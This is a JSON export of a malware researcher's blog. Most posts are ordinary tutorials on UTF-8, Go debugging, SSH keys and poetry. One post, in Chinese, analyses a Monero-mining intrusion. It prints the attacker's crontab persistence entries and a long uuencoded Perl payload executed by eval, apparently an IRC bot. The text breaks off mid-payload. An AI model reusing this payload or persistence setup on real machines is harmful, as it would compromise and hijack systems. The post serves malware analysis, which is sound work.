{"meta":{"title":"JunWei Song' Blog","subtitle":"Code it, and break it","description":"","author":"JunWei Song","url":"https://krnick.github.io"},"pages":[{"title":"Categories","date":"2020-09-23T05:06:09.000Z","updated":"2025-06-30T10:40:10.169Z","comments":false,"path":"categories/index.html","permalink":"https://krnick.github.io/categories/index.html","excerpt":"","text":"","raw":null,"content":null},{"title":"About","date":"2025-06-30T10:41:44.851Z","updated":"2025-06-30T10:41:44.844Z","comments":false,"path":"about/index.html","permalink":"https://krnick.github.io/about/index.html","excerpt":"","text":"Hi there 👋JunWei is a senior malware researcher at Recorded Future Triage Sandbox, interested in the field of reverse engineering, malware analysis, threat intelligence, and developing tools to aid malware analysis. He has been very involved in the security community, previously leading Quark-Engine and mentoring GSoC under the Honeynet Project. Outside of work, he volunteers for the PyCon TW community, has been a member of the Review Board since 2020, and served as the PyCon APAC 2022 Program Chair. He is passionate about contributing to the community and helping to organize the PyCon Taiwan program committee. He also enjoys sharing his security and malware research through talks. He has presented at various security conferences, such as Black Hat Asia, DEFCON BTV, Virus Bulletin, HITB, and ROOTCON. Open Source Community Quark-Engine - Creator sunzip - Creator Androguard - Contributor &amp; PyPi Maintainer Kali Linux - Quark-Engine package maintainer Google Summer of Code - Mentor under Honeynet project Talks 🌱 My Previous Talks","raw":null,"content":null},{"title":"Tags","date":"2020-09-23T05:06:01.000Z","updated":"2025-06-30T10:40:10.169Z","comments":false,"path":"tags/index.html","permalink":"https://krnick.github.io/tags/index.html","excerpt":"","text":"","raw":null,"content":null}],"posts":[{"title":"Unicode, ASCII, and why UTF-8","slug":"Unicode-ASCII-and-why-UTF-8","date":"2023-05-09T13:01:54.000Z","updated":"2025-06-30T10:40:10.169Z","comments":true,"path":"2023/05/09/Unicode-ASCII-and-why-UTF-8/","link":"","permalink":"https://krnick.github.io/2023/05/09/Unicode-ASCII-and-why-UTF-8/","excerpt":"","text":"Unicode, ASCII, and why UTF-8歷史很久以前，只有 ASCII ，當時所使用的符號並不多，所以可以透過 ASCII 來做一對一的符號對照表， ASCII 用了 7 個 bits 來表示 128 個 character，包括大寫英文字母、小寫英文字母、以及其他符號。 然而，隨著其他語言的興起，ASCII 已經不能再完全表達所有語言的符號，例如中文、日文、韓文等等，因此 Unicode 出現了作為解決方案。Unicode 這套對照表可以對照世界上所有的符號，例如 “你” 的 Unicode 編碼就是 “\\u4f60”，而這個 \\u4f60 稱之為 Unicode code point。 Unicode 解析編碼有幾種，包括 UTF-32、UTF-16、UTF-8。其中，UTF-32 使用固定 32 bits 或 4 bytes 的空間來儲存，依此類推，但最大的問題是會有空間浪費的問題。因此，最常被使用的解析編碼方式是 UTF-8。UTF-8 則是一種長度可變的編碼方式，可以同時解析介於 8 bits 到 32 bits 長度的字元（1 byte 到 4 bytes），對於 ASCII 則是 1 byte 也就代表可以兼容 ASCII。最高位元的 bit 代表接下來的 UTF-8 使用了幾個 byte。 當我們使用 \\x 表示一個字元時，後面的十六進制數字表示這個字元在 UTF-8 編碼中所佔用的字節的值。例如，\\x41 表示 ASCII 範圍內的大寫字母 A，因為它的 UTF-8 編碼只需要一個字節，而這個字節的值恰好是 41（十六進制）。 UTF-8 格式0xxxxxxx -&gt; 0-127 (同 ASCII)110xxxxx 10xxxxxx -&gt; 128-20471110xxxx 10xxxxxx 10xxxxxx -&gt; 2048-6553511110xxx 10xxxxxx 10xxxxxx 10xxxxxx -&gt; 65536-0x10ffff \\x 代表 1 byte\\u 代表 16 bit unicode (\\uhhhh)\\U 代表 2 bit unicode (\\Uhhhhhhhh) 例如 世界 “\\u4e16\\u754c” 為 世界 的 \\u unicode code point 表示法 “\\xe4\\xb8\\x96\\xe7\\x95\\x8c” 為 世界 的 \\x unicode code point 表示法 其中，若要將 “\\u4e16” 轉換為單一 byte 的表示方式，轉換流程如下： 先將”\\u4e16”轉換成2進位表示 -&gt; 0100111000010110 依照範圍，0100111000010110 需要使用3個bytes，也就是 1110xxxx 10xxxxxx 10xxxxxx 將對應的2進位 -&gt; 0100111000010110，依序填入 xxx 中 得到結果：11100100 10111000 10010110 再將此2進位表示轉換為16進位 -&gt; E4B896 因此，”\\u4e16”在UTF-8編碼下所對應的bytes為3，並且分別為”\\xE4”、”\\xB8”和”\\x96”。 Ref:https://www.youtube.com/watch?v=ut74oHojxqo&amp;ab_channel=StudyingWithAlex","raw":null,"content":null,"categories":[],"tags":[]},{"title":"Debug Golang with VSCode","slug":"Debug-Golang-with-VSCode","date":"2023-05-01T08:19:35.000Z","updated":"2025-06-30T10:40:10.168Z","comments":true,"path":"2023/05/01/Debug-Golang-with-VSCode/","link":"","permalink":"https://krnick.github.io/2023/05/01/Debug-Golang-with-VSCode/","excerpt":"","text":"Debug Golang with VSCodeExampleCreate a simple go lang file with the below code: main.go 123456789101112131415package mainimport ( &quot;fmt&quot; &quot;os&quot; &quot;strings&quot;)func main() &#123; fmt.Println(&quot;hello world&quot;) name := os.Args[1:] fmt.Println(&quot;hello &quot; + strings.Join(name, &quot;&quot;))&#125; Make sure the go.mod is initialized go.mod 123module test-debuggo 1.19 it will print the args from the command-line args Switch to the Run and DebugAnd choose the create a launch.json file and fill in the config for debugging The config example is below: 12345678910111213141516&#123; // Use IntelliSense to learn about possible attributes. // Hover to view descriptions of existing attributes. // For more information, visit: https://go.microsoft.com/fwlink/?linkid=830387 &quot;version&quot;: &quot;0.2.0&quot;, &quot;configurations&quot;: [ &#123; &quot;name&quot;: &quot;Launch Package&quot;, &quot;type&quot;: &quot;go&quot;, &quot;request&quot;: &quot;launch&quot;, &quot;mode&quot;: &quot;auto&quot;, &quot;program&quot;: &quot;$&#123;fileDirname&#125;&quot;, &quot;args&quot;: [&quot;nick&quot;,&quot;ben&quot;] &#125; ]&#125; the args are the arguments you want to put after the go program, for example: go run main.go nick ben then the “args“ is: &quot;args&quot;: [&quot;nick&quot;,&quot;ben&quot;] Now you can start your debugging","raw":null,"content":null,"categories":[],"tags":[]},{"title":"Using SSH to connect with Github","slug":"Using-SSH-to-connect-with-Github","date":"2022-06-05T14:31:51.000Z","updated":"2025-06-30T10:40:10.169Z","comments":true,"path":"2022/06/05/Using-SSH-to-connect-with-Github/","link":"","permalink":"https://krnick.github.io/2022/06/05/Using-SSH-to-connect-with-Github/","excerpt":"","text":"Using SSH to connect with GithubCreat your own dir for ssh123mkdir ~/.sshchmod 700 ~/.ssh Generate your Key123456cd ~/.sshssh-keygen -t rsa -b 4096 -C &quot;your@gmail.com&quot;# copy item from id_rsa.pubcat id_rsa.pub Set up your Github Paste your content of the id_rsa.pub to here Test it1ssh -T git@github.com 1git@github.com:krnick/your_repo.git","raw":null,"content":null,"categories":[],"tags":[]},{"title":"Cheat sheet for poetry","slug":"Cheat-sheet-for-poetry","date":"2022-05-04T06:05:07.000Z","updated":"2025-06-30T10:40:10.168Z","comments":true,"path":"2022/05/04/Cheat-sheet-for-poetry/","link":"","permalink":"https://krnick.github.io/2022/05/04/Cheat-sheet-for-poetry/","excerpt":"","text":"Cheat sheet for poetryInit project1poetry init Open existing project1poetry install Build shell1poetry env use python3 Active1poetry shell New Package1234poetry add blackpoetry add pendulum@^2.0.5poetry add &quot;pendulum&gt;=2.0.5&quot; Remove Package1poetry remove New Package -dev1poetry add black -D Lock Package1poetry lock Export1poetry export -f requirements.txt -o requirements.txt --without-hashes --dev","raw":null,"content":null,"categories":[],"tags":[]},{"title":"Mining malware analysis","slug":"Mining-malware-analysis","date":"2022-04-22T07:17:09.000Z","updated":"2025-06-30T10:40:10.169Z","comments":true,"path":"2022/04/22/Mining-malware-analysis/","link":"","permalink":"https://krnick.github.io/2022/04/22/Mining-malware-analysis/","excerpt":"","text":"Mining malware analysis1netstat -antp 大量的 ip 對 107.191.99.95 的 port 80 進行連線，且發現每次重開機後都會重新連線，應該是有開機自啟動。 107.191.99.95 經調查是門羅幣的挖礦 再來分析，使用的程式 cron PID 為 1475 1ps -aux |grep 1475 發現是 .&#x2F;cron 使用者居然是 test2 (看來是同學帳號亂建立，被暴力入侵而得) 1find . -name cron* 找到檔案 cron.d &#x2F;home&#x2F;test2&#x2F;.firefoxcatche&#x2F;cron.d 123456* */12 * * * /home/test2/.firefoxcatche/a/upd&gt;/dev/null 2&gt;&amp;1@reboot /home/test2/.firefoxcatche/a/upd&gt;/dev/null 2&gt;&amp;15 8 * * 0 /home/test2/.firefoxcatche/b/sync&gt;/dev/null 2&gt;&amp;1@reboot /home/test2/.firefoxcatche/b/sync&gt;/dev/null 2&gt;&amp;1 #5 1 * * * /tmp/.X13-unix/.rsync/c/aptitude&gt;/dev/null 2&gt;&amp;1 test2 帳號的 crontab 被放了什麼東西進來 主要的惡意程式邏輯應該在 .firefoxcatche cron.d 是最後要執行的程式 會執行 a&#x2F;upd@reboot 後 a&#x2F;upd b&#x2F;sync@reboot 後 b&#x2F;sync &#x2F;tmp&#x2F;.X13-unix&#x2F;.rsync&#x2F;c&#x2F;aptitude 先來看 a 資料夾 a&#x2F;a a&#x2F;upd a&#x2F;stop a&#x2F;run a&#x2F;init0 看起來是自毀程式 最後會執行 anacron 這個執行檔案 再來是 b 資料夾 b&#x2F;a b&#x2F;sync b&#x2F;ps 二進位執行檔案 b&#x2F;rsync 1eval unpack u=&gt;q&#123;_&quot;FUY(&quot;1P&lt;F]C97-S;R`](&quot;=R&lt;WEN8R&lt;[&quot;@HD&lt;V5R=FED;W(])S4N,C4U+C@V+C$R.2&lt;@=6YL97-S(&quot;1S97)V_:61O&lt;CL*;7D@)&#x27;!O&lt;G1A/2&lt;T-#,G.PIM&gt;2!`8V%N86ES/2@B(S`P-R(I.PIM&gt;2!`861M&lt;STH(D$B+&quot;)8(BD[_&quot;FUY($!A=71H/2@B;&amp;]C86QH;W-T(BD[&quot;@IM&gt;2`D;&amp;EN87-?;6%X/38[&quot;FUY(&quot;1S;&amp;5E&lt;#TS.PH*;7D@)&amp;YI_8VL@/2!G971N:6-K*&quot;D[&quot;FUY(&quot;1I&lt;F-N86UE(#T@9V5T;FEC:R@I.PIM&gt;2`D&lt;F5A;&amp;YA;64@/2`H8&#x27;5N86UE_(&quot;UA8&quot;D[&quot;@IM&gt;2`D86-E&lt;W-O&lt;VAE;&amp;P@/2`Q.PIM&gt;2`D&lt;&#x27;)E9FEX;R`](&quot;(A(&quot;([&quot;FUY(&quot;1E&lt;W1A=&amp;ES=&amp;EC_87,@/2`P.PIM&gt;2`D&lt;&amp;%C;W1E&lt;R`](#$[&quot;@IM&gt;2`D5D524T%/(#T@)S`N,F$G.PH*)%-)1WLG24Y4)WT@/2`G_24=.3U)%)SL*)%-)1WLG2%50)WT@/2`G24=.3U)%)SL*)%-)1WLG5$5232=](#T@)TE&#x27;3D]212&lt;[&quot;B1324=[_)T-(3$0G?2`](&quot;=)1TY/4D4G.PHD4TE&#x27;&gt;R=04R=](#T@)TE&#x27;3D]212&lt;[&quot;@IU&lt;V4@24\\Z.E-O8VME=#L*=7-E_(%-O8VME=#L*=7-E($E/.CI396QE8W0[&quot;F-H9&amp;ER*&quot;(O(BD[&quot;B1S97)V:61O&lt;CTB)$%21U9;,%TB(&amp;EF(&quot;1!_4D=66S!=.PHD,#TB)&#x27;!R;V-E&lt;W-O(BXB7#`B.PIM&gt;2`D&lt;&amp;ED/69O&lt;FL[&quot;F5X:70@:68@)&#x27;!I9#L*9&amp;EE(&quot;)0_&lt;F]B;&amp;5M82!C;VT@;R!F;W)K.B`D(2(@=6YL97-S(&amp;1E9FEN960H)&#x27;!I9&quot;D[&quot;@IM&gt;2`E:7)C7W-E&lt;G9E&lt;G,[_&quot;FUY(&quot;5$0T,[&quot;FUY(&quot;1D8V-?&lt;V5L(#T@;F5W($E/.CI396QE8W0M/FYE=R@I.PH*&quot;@H*&lt;W5B(&amp;=E=&amp;YI8VL@_&gt;PH@(&#x27;)E=&#x27;5R;B`B&gt;&quot;(N:6YT*&#x27;)A;F0H.3`P,&quot;DI.PI]&quot;@H*&lt;W5B(&amp;=E=&amp;ED96YT(&#x27;L*(&quot;!M&gt;2`D&lt;F5T;W)N_;VED96YT(#T@)E]G970H(FAT=&#x27;`Z+R]W=W&lt;N;6EN&lt;&amp;]P+F-O;2]S:S$R&lt;&amp;%C:R]I9&amp;5N=&#x27;,N&lt;&amp;AP(BD[&quot;B`@_;7D@)&amp;ED96YT8VAA;F-E(#T@:6YT*&#x27;)A;F0H,3`P,&quot;DI.PH@(&amp;EF(&quot;@D:61E;G1C:&amp;%N8V4@/B`S,&quot;D@&gt;PH@_(&quot;`@(&#x27;)E=&#x27;5R;B`D;FEC:SL*(&quot;!](&amp;5L&lt;V4@&gt;PH@(&quot;`@(&#x27;)E=&#x27;5R;B`D&lt;F5T;W)N;VED96YT.PH@(&#x27;T*(&quot;!R_971U&lt;FX@)&#x27;)E=&amp;]R;F]I9&amp;5N=#L*?0H*&lt;W5B(&amp;=E=&amp;YA;64@&gt;PH@(&amp;UY(&quot;1R971O&lt;FYO;F%M92`](&quot;9?9V5T_*&quot;)H=&#x27;1P.B\\O=W=W+FUI;G!O&lt;&quot;YC;VTO&lt;VLQ,G!A8VLO;F%M97,N&lt;&amp;AP(BD[&quot;B`@&lt;F5T=7)N(&quot;1R971O&lt;FYO_;F%M93L*?0H*&lt;W5B(&amp;=E=&amp;ED96YT,B![&quot;B`@(&quot;`@(&quot;`@;7D@)&amp;QE;F=T:#US:&amp;EF=#L*(&quot;`@(&quot;`@(&quot;`D;&amp;5N_9W1H(#T@,R!I9B`H)&amp;QE;F=T:&quot;`\\(#,I.PH*(&quot;`@(&quot;`@(&quot;!M&gt;2!`8VAA&lt;G,]*&quot;=A)RXN)WHG+&quot;=!)RXN)UHG_+&quot;&lt;Q)RXN)SDG*3L*(&quot;`@(&quot;`@(&quot;!F;W)E86-H(&quot;@Q+BXD;&amp;5N9W1H*0H@(&quot;`@(&quot;`@(&#x27;L*(&quot;`@(&quot;`@(&quot;`@(&quot;`@_(&quot;`@(&quot;1R86YD;VUS=&#x27;)I;F&lt;N/21C:&amp;%R&lt;UMR86YD($!C:&amp;%R&lt;UT[&quot;B`@(&quot;`@(&quot;`@?0H@(&quot;`@(&quot;`@(&#x27;)E=&#x27;5R_;B`D&lt;F%N9&amp;]M&lt;W1R:6YG.PI]&quot;@IS=6(@9V5T&lt;W1O&lt;F4@*&quot;0D*0I[&quot;B`@;7D@)&#x27;5R;&quot;`](&#x27;-H:69T.PH@(&amp;UY_(&quot;1F:6QE(#T@&lt;VAI9G0[&quot;@H@(&quot;1H=&#x27;1P7W-T&lt;F5A;5]O=70@/2`Q.PH@(&amp;]P96XH1T547T]55$9)3$4L(&quot;(^_(&quot;1F:6QE(BD[&quot;B`@)6AT=&#x27;!?;&amp;]O&lt;%]C:&amp;5C:R`](&quot;@I.PH@(%]G970H)&#x27;5R;&quot;D[&quot;B`@8VQO&lt;V4@1T547T]5_5$9)3$4[&quot;B`@&lt;F5T=7)N(&quot;1M86EN.CIH=&#x27;1P7V=E=%]R97-U;&#x27;0[&quot;GT*&quot;G-U8B!?9V5T&quot;GL*(&quot;!M&gt;2`D=7)L_(#T@&lt;VAI9G0[&quot;B`@;7D@)&#x27;!R;WAY(#T@(B([&quot;B`@9W)E&lt;&quot;![*&amp;QC*&quot;1?*2!E&lt;2`B:&#x27;1T&lt;%]P&lt;F]X&gt;2(I(&quot;8F_(&quot;@D&lt;&#x27;)O&gt;&#x27;D@/2`D14Y6&gt;R1??2E](&amp;ME&gt;7,@)45.5CL*(&quot;!I9B`H*&quot;1P&lt;F]X&gt;2!E&lt;2`B(BD@)B8@)&#x27;5R;&quot;`]_?B!M+%YH=&#x27;1P.B\\O*%M&gt;+SI=*RDH/SHZ*%QD*RDI/R@O7%,J*3\\D+&quot;D@&gt;PH@(&quot;`@;7D@)&amp;AO&lt;W0@/2`D,3L*_(&quot;`@(&amp;UY(&quot;1P;W)T(#T@)#(@?&#x27;P@.#`[&quot;B`@(&quot;!M&gt;2`D&lt;&amp;%T:&quot;`](&quot;0S.PH@(&quot;`@)&#x27;!A=&amp;@@/2`B+R(@=6YL_97-S(&amp;1E9FEN960H)&#x27;!A=&amp;@I.PH@(&quot;`@&lt;F5T=7)N(%]T&lt;FEV:6%L7VAT=&#x27;!?9V5T*&quot;1H;W-T+&quot;`D&lt;&amp;]R=&quot;P@_)&#x27;!A=&amp;@I.PH@(&#x27;T@96QS:68@*&quot;1P&lt;F]X&gt;2`]?B!M+%YH=&#x27;1P.B\\O*%M&gt;+SI=*RDZ*%QD*RDH+UQ3*BD_)&quot;PI_(&#x27;L*(&quot;`@(&amp;UY(&quot;1H;W-T(#T@)#$[&quot;B`@(&quot;!M&gt;2`D&lt;&amp;]R=&quot;`](&quot;0R.PH@(&quot;`@;7D@)&#x27;!A=&amp;@@/2`D=7)L.PH@_(&quot;`@&lt;F5T=7)N(%]T&lt;FEV:6%L7VAT=&#x27;!?9V5T*&quot;1H;W-T+&quot;`D&lt;&amp;]R=&quot;P@)&#x27;!A=&amp;@I.PH@(&#x27;T@96QS92![&quot;B`@_(&quot;!R971U&lt;FX@=6YD968[&quot;B`@?0I]&quot;@H*&lt;W5B(%]T&lt;FEV:6%L7VAT=&#x27;!?9V5T&quot;GL*(&quot;!M&gt;2@D:&amp;]S=&quot;P@)&#x27;!O_&lt;G0L(&quot;1P871H*2`]($!?.PH@(&amp;UY*&quot;1!1T5.5&quot;P@)%9%4E-)3TXL(&quot;1P*3L*&quot;B`@)$%&#x27;14Y4(#T@(F=E=&quot;UM_:6YI;6%L(CL*(&quot;`D5D524TE/3B`](&quot;(R,#`P,#$Q.&quot;([&quot;@H@(&quot;1P871H(#U^(&#x27;,O(&quot;\\E,C`O9SL*&quot;B`@&lt;F5Q_=6ER92!)3SHZ4V]C:V5T.PH@(&amp;QO8V%L*&quot;1&gt;5RD@/2`P.PH@(&amp;UY(&quot;1S;V-K(#T@24\\Z.E-O8VME=#HZ24Y%_5&quot;T^;F5W*%!E97)!9&amp;1R(#T^(&quot;1H;W-T+`H@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(%!E_97)0;W)T(#T^(&quot;1P;W)T+`H@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(%!R;W1O(&quot;`@/3X@_)W1C&lt;&quot;&lt;L&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@5&amp;EM96]U=&quot;`@/3X@-C`I(&#x27;Q\\(&#x27;)E_=&#x27;5R;CL*(&quot;`D&lt;V]C:RT^875T;V9L=7-H.PH@(&amp;UY(&quot;1N971L;V,@/2`D:&amp;]S=#L*(&quot;`D;F5T;&amp;]C(&quot;X](&quot;(Z_)&#x27;!O&lt;G0B(&amp;EF(&quot;1P;W)T(&quot;$](#@P.PH@(&amp;UY(&quot;1R97%U97-T(#T@(D=%5&quot;`D&lt;&amp;%T:&quot;!(5%10+S$N,%PP,35&lt;_,#$R(@H@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;X@(DAO&lt;W0Z(&quot;1N971L;V-&lt;,#$U7#`Q,B(*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`N(&quot;)5_&lt;V5R+4%G96YT.B`D04=%3E0O)%9%4E-)3TXO=5PP,35&lt;,#$R(CL*(&quot;`D&lt;F5Q=65S=&quot;`N/2`B4&#x27;)A9VUA.B!N_;RUC86-H95PP,35&lt;,#$R(B!I9B`H)&amp;UA:6XZ.FAT=&#x27;!?;F]?8V%C:&amp;4I.PH@(&quot;1R97%U97-T(&quot;X](&quot;)&lt;,#$U_7#`Q,B([&quot;B`@&lt;&#x27;)I;G0@)&#x27;-O8VL@)&#x27;)E&lt;75E&lt;W0[&quot;@H@(&amp;UY(&quot;1B=68@/2`B(CL*(&quot;!M&gt;2`D;CL*(&quot;!M&gt;2`D_8C$@/2`B(CL*(&quot;!W:&amp;EL92`H)&amp;X@/2!S&gt;7-R96%D*&quot;1S;V-K+&quot;`D8G5F+&quot;`X*C$P,C0L(&amp;QE;F=T:&quot;@D8G5F_*2DI(&#x27;L*(&quot;`@(&amp;EF(&quot;@D8C$@97$@(B(I(&#x27;L@&quot;B`@(&quot;`@(&quot;1B,2`](&quot;1B=68[(&quot;`@(&quot;`@(&quot;`@&quot;B`@(&quot;`@(&quot;1B_=68@/7X@&lt;R\\N*S]&lt;,#$U/UPP,3)&lt;,#$U/UPP,3(O+W,[(&quot;`@(&quot;`@&quot;B`@(&quot;!]&quot;B`@(&quot;!I9B`H)&amp;AT=&#x27;!?&lt;W1R_96%M7V]U=&quot;D@&gt;R!P&lt;FEN=&quot;!&#x27;151?3U541DE,12`D8G5F.R`D8G5F(#T@(B([(&#x27;T*(&quot;!]&quot;B`@&lt;F5T=7)N(&#x27;5N_9&amp;5F(&#x27;5N;&amp;5S&lt;R!D969I;F5D*&quot;1N*3L*&quot;B`@)&amp;UA:6XZ.FAT=&#x27;!?9V5T7W)E&lt;W5L=&quot;`](#(P,#L*(&quot;!I9B`H_)&amp;(Q(#U^(&amp;TL7DA45%`O7&amp;0K7&quot;Y&lt;9&quot;M&lt;&lt;RLH7&amp;0K*5M&gt;7#`Q,ETJ7#`Q,BPI(&#x27;L*(&quot;`@(&quot;1M86EN.CIH=&#x27;1P_7V=E=%]R97-U;&#x27;0@/2`D,3L*(&quot;`@(&amp;EF(&quot;@D;6%I;CHZ:&#x27;1T&lt;%]G971?&lt;F5S=6QT(#U^(&quot;]&gt;,S!;,3(S-UTO_(&quot;8F(&quot;1B,2`]?B`O7#`Q,DQO8V%T:6]N.EQS*BA&lt;4RLI+PHI(&#x27;L*(&quot;`@(&quot;`@;7D@)&#x27;5R;&quot;`](&quot;0Q.PH@(&quot;`@_(&quot;!R971U&lt;FX@=6YD968@:68@)&amp;AT=&#x27;!?;&amp;]O&lt;%]C:&amp;5C:WLD=7)L?2LK.PH@(&quot;`@(&quot;!R971U&lt;FX@7V=E=&quot;@D_=7)L*3L*(&quot;`@(&#x27;T*(&quot;`@(&#x27;)E=&#x27;5R;B!U;F1E9B!U;FQE&lt;W,@)&amp;UA:6XZ.FAT=&#x27;!?9V5T7W)E&lt;W5L=&quot;`]?B`O_7C(O.PH@(&#x27;T*&quot;B`@&lt;F5T=7)N(&quot;1B=68[&quot;GT*&quot;@HD&lt;V5L7V-L:65N=&amp;4@/2!)3SHZ4V5L96-T+3YN97&lt;H*3L*_&lt;W5B(&#x27;-E;F1R87&lt;@&gt;PH@(&amp;EF(&quot;@D(U\\@/3T@)S$G*2![&quot;B`@(&quot;!M&gt;2`D&lt;V]C:V5T(#T@)%];,%T[&quot;B`@(&quot;!P_&lt;FEN=&quot;`D&lt;V]C:V5T(&quot;(D7ULQ75QN(CL*(&quot;!](&amp;5L&lt;V4@&gt;PH@(&quot;`@(&quot;!P&lt;FEN=&quot;`D25)#7V-U&lt;E]S;V-K970@_(B1?6S!=7&amp;XB.PH@(&#x27;T*?0H*&lt;W5B(&amp;-O;F5C=&amp;%R(&#x27;L*(&quot;`@;7D@)&amp;UE=6YI8VL@/2`D7ULP73L*(&quot;`@;7D@_)&#x27;-E&lt;G9I9&amp;]R7V-O;B`](&quot;1?6S%=.PH@(&quot;!M&gt;2`D&lt;&amp;]R=&amp;%?8V]N(#T@)%];,ET[&quot;@H@(&quot;!M&gt;2`D25)#7W-O_8VME=&quot;`]($E/.CI3;V-K970Z.DE.150M/FYE=RA0&lt;F]T;ST^(G1C&lt;&quot;(L(%!E97)!9&amp;1R/3XB)&#x27;-E&lt;G9I9&amp;]R_7V-O;B(L(%!E97)0;W)T/3XD&lt;&amp;]R=&amp;%?8V]N*2!O&lt;B!R971U&lt;FXH,2D[&quot;B`@(&amp;EF(&quot;AD969I;F5D*&quot;1)4D-?_&lt;V]C:V5T*2D@&gt;PH@(&quot;`@(&quot;1)4D-?8W5R7W-O8VME=&quot;`](&quot;1)4D-?&lt;V]C:V5T.PH*(&quot;`@(&quot;`D25)#7W-O8VME_=&quot;T^875T;V9L=7-H*#$I.PH@(&quot;`@(&quot;1S96Q?8VQI96YT92T^861D*&quot;1)4D-?&lt;V]C:V5T*3L*&quot;B`@(&quot;`@)&amp;ER_8U]S97)V97)S&gt;R1)4D-?8W5R7W-O8VME=&#x27;U[)VAO&lt;W0G?2`](&quot;(D&lt;V5R=FED;W)?8V]N(CL*(&quot;`@(&quot;`D:7)C_7W-E&lt;G9E&lt;G-[)$E20U]C=7)?&lt;V]C:V5T?7LG&lt;&amp;]R=&amp;$G?2`](&quot;(D&lt;&amp;]R=&amp;%?8V]N(CL*(&quot;`@(&quot;`D:7)C7W-E_&lt;G9E&lt;G-[)$E20U]C=7)?&lt;V]C:V5T?7LG;FEC:R=](#T@)&amp;UE=6YI8VL[&quot;B`@(&quot;`@)&amp;ER8U]S97)V97)S&gt;R1)_4D-?8W5R7W-O8VME=&#x27;U[)VUE=6EP)WT@/2`D25)#7W-O8VME=&quot;T^&lt;V]C:VAO&lt;W0[&quot;B`@(&quot;`@;FEC:R@B)&amp;UE_=6YI8VLB*3L*(&quot;`@(&quot;!S96YD&lt;F%W*&quot;)54T52(&quot;1I&lt;F-N86UE(&quot;(N)$E20U]S;V-K970M/G-O8VMH;W-T+B(@_)&#x27;-E&lt;G9I9&amp;]R7V-O;B`Z)&#x27;)E86QN86UE(BD[&quot;B`@(&quot;`@&lt;VQE97`@,CL*(&quot;`@?0H*?0IM&gt;2`D;&amp;EN95]T96UP_.PIW:&amp;EL92@@,2`I(&#x27;L*(&quot;`@=VAI;&amp;4@*&quot;$H:V5Y&lt;R@E:7)C7W-E&lt;G9E&lt;G,I*2D@&gt;R!C;VYE8W1A&lt;B@B)&amp;YI_8VLB+&quot;`B)&#x27;-E&lt;G9I9&amp;]R(BP@(B1P;W)T82(I.R!]&quot;B`@(&amp;1E;&amp;5T92@D:7)C7W-E&lt;G9E&lt;G-[)R=]*2!I9B`H_9&amp;5F:6YE9&quot;@D:7)C7W-E&lt;G9E&lt;G-[)R=]*2D[&quot;B`@(&quot;9$0T,Z.F-O;FYE8W1I;VYS.PH@(&quot;!M&gt;2!`&lt;F5A9&#x27;D@_/2`D&lt;V5L7V-L:65N=&amp;4M/F-A;E]R96%D*#`N-BD[&quot;B`@(&amp;YE&gt;&#x27;0@=6YL97-S*$!R96%D&gt;2D[&quot;B`@(&amp;9O&lt;F5A_8V@@)&amp;9H(&quot;A`&lt;F5A9&#x27;DI(&#x27;L*(&quot;`@(&quot;`D25)#7V-U&lt;E]S;V-K970@/2`D9F@[&quot;B`@(&quot;`@)&amp;UE=6YI8VL@/2`D_:7)C7W-E&lt;G9E&lt;G-[)$E20U]C=7)?&lt;V]C:V5T?7LG;FEC:R=].PH@(&quot;`@(&quot;1N&lt;F5A9&quot;`](&#x27;-Y&lt;W)E860H)&amp;9H_+&quot;`D;7-G+&quot;`T,#DV*3L*(&quot;`@(&quot;!I9B`H)&amp;YR96%D(#T](#`I(&#x27;L*(&quot;`@(&quot;`@(&quot;`D&lt;V5L7V-L:65N=&amp;4M/G)E_;6]V92@D9F@I.PH@(&quot;`@(&quot;`@(&quot;1F:&quot;T^8VQO&lt;V4[&quot;B`@(&quot;`@(&quot;`@9&amp;5L971E*&quot;1I&lt;F-?&lt;V5R=F5R&lt;WLD9FA]_*3L*(&quot;`@(&quot;!]&quot;B`@(&quot;`@0&amp;QI;F5S(#T@&lt;W!L:70@*&quot;]&lt;;B\\L(&quot;1M&lt;V&lt;I.PH*(&quot;`@(&quot;!F;W(H;7D@)&amp;,],#L@_)&amp;,\\/2`D(VQI;F5S.R`D8RLK*2![&quot;B`@(&quot;`@(&quot;`D;&amp;EN92`](&quot;1L:6YE&lt;ULD8UT[&quot;B`@(&quot;`@(&quot;`D;&amp;EN93TD_;&amp;EN95]T96UP+B1L:6YE(&amp;EF(&quot;@D;&amp;EN95]T96UP*3L*(&quot;`@(&quot;`@(&quot;1L:6YE7W1E;7`])R&lt;[&quot;B`@(&quot;`@(&quot;`D_;&amp;EN92`]?B!S+UQR)&quot;\\O.PH@(&quot;`@(&quot;`@=6YL97-S(&quot;@D8R`]/2`D(VQI;F5S*2![&quot;B`@(&quot;`@(&quot;`@(&#x27;!A&lt;G-E_*&quot;(D;&amp;EN92(I.PH@(&quot;`@(&quot;`@?2!E;&#x27;-E(&#x27;L*(&quot;`@(&quot;`@(&quot;`@(&quot;!I9B`H)&quot;-L:6YE&lt;R`]/2`P*2![&quot;B`@(&quot;`@_(&quot;`@(&quot;`@(&quot;!P87)S92@B)&amp;QI;F4B*3L*(&quot;`@(&quot;`@(&quot;`@(&quot;!](&amp;5L&lt;VEF(&quot;@D;&amp;EN97-;)&amp;-=(#U^(&quot;]&lt;&lt;B0O_*2![&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&#x27;!A&lt;G-E*&quot;(D;&amp;EN92(I.PH@(&quot;`@(&quot;`@(&quot;`@(&#x27;T@96QS:68@*&quot;1L:6YE(#U^_(&quot;]&gt;*%Q3*RD@3D]424-%($%55$@@.EPJ7&quot;I&lt;*B\\I(&#x27;L*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@&lt;&amp;%R&lt;V4H(B1L:6YE(BD[_&quot;B`@(&quot;`@(&quot;`@(&quot;`@?2!E;&#x27;-E(&#x27;L*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@)&amp;QI;F5?=&amp;5M&lt;&quot;`](&quot;1L:6YE.PH@(&quot;`@(&quot;`@_(&quot;`@(&#x27;T*(&quot;`